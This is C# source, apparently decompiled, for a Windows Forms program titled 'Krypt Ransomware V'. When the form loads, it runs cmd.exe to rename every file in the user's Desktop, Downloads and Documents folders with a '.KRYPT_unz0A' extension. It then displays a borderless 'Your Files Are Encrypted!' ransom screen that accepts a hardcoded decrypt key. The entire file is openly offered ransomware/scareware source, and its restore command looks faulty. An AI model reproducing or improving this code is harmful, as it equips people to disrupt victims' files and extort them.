using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Windows.Forms;

namespace Krypt_Ransomware_V;

public class Form1 : Form
{
	private IContainer components = null;

	private Label label1;

	private Label label2;

	private TextBox textBox1;

	private Button button1;

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Process.Start("C:\\Windows\\System32\\cmd.exe", "/c ren C:\\Users\\" + Environment.UserName + "\\Desktop\\*.* *.*.KRYPT_unz0A");
		Process.Start("C:\\Windows\\System32\\cmd.exe", "/c ren C:\\Users\\" + Environment.UserName + "\\Downloads\\*.* *.*.KRYPT_unz0A");
		Process.Start("C:\\Windows\\System32\\cmd.exe", "/c ren C:\\Users\\" + Environment.UserName + "\\Documents\\*.* *.*.KRYPT_unz0A");
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_007e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0091: Unknown result type (might be due to invalid IL or missing references)
		string text = ((Control)textBox1).get_Text();
		if (text == "ypdx5xyxrxqxex0ex8pxjxrkxlx")
		{
			Process.Start("C:\\Windows\\System32\\cmd.exe", "/c ren C:\\Users\\" + Environment.UserName + "\\Desktop\\*.*.* *.");
			Process.Start("C:\\Windows\\System32\\cmd.exe", "/c ren C:\\Users\\" + Environment.UserName + "\\Downloads\\*.*.* *.");
			Process.Start("C:\\Windows\\System32\\cmd.exe", "/c ren C:\\Users\\" + Environment.UserName + "\\Documents\\*.*.* *.");
			MessageBox.Show("Files are Succesfully Decrypted!");
			((Form)this).Close();
		}
		else
		{
			MessageBox.Show("Incorrect Decrypt Key!");
		}
	}

	private void label2_Click(object sender, EventArgs e)
	{
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_0065: Unknown result type (might be due to invalid IL or missing references)
		//IL_006f: Expected O, but got Unknown
		//IL_00fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0106: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		label1 = new Label();
		label2 = new Label();
		textBox1 = new TextBox();
		button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Font(new Font("맑은 고딕", 18f, (FontStyle)1, (GraphicsUnit)3, (byte)129));
		((Control)label1).set_ForeColor(Color.Red);
		((Control)label1).set_Location(new Point(241, 40));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(305, 32));
		((Control)label1).set_TabIndex(0);
		((Control)label1).set_Text("Your Files Are Encrypted!");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Font(new Font("맑은 고딕", 9f, (FontStyle)0, (GraphicsUnit)3, (byte)129));
		((Control)label2).set_ForeColor(Color.Red);
		((Control)label2).set_Location(new Point(13, 98));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(760, 270));
		((Control)label2).set_TabIndex(1);
		((Control)label2).set_Text(componentResourceManager.GetString("label2.Text"));
		label2.set_TextAlign((ContentAlignment)2);
		((Control)label2).add_Click((EventHandler)label2_Click);
		((Control)textBox1).set_Location(new Point(225, 382));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(329, 21));
		((Control)textBox1).set_TabIndex(2);
		((Control)button1).set_Location(new Point(225, 409));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(329, 29));
		((Control)button1).set_TabIndex(3);
		((Control)button1).set_Text("Decrypt My Files");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(7f, 12f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.ActiveCaptionText);
		((Form)this).set_ClientSize(new Size(783, 487));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Krypt Ransomware V");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
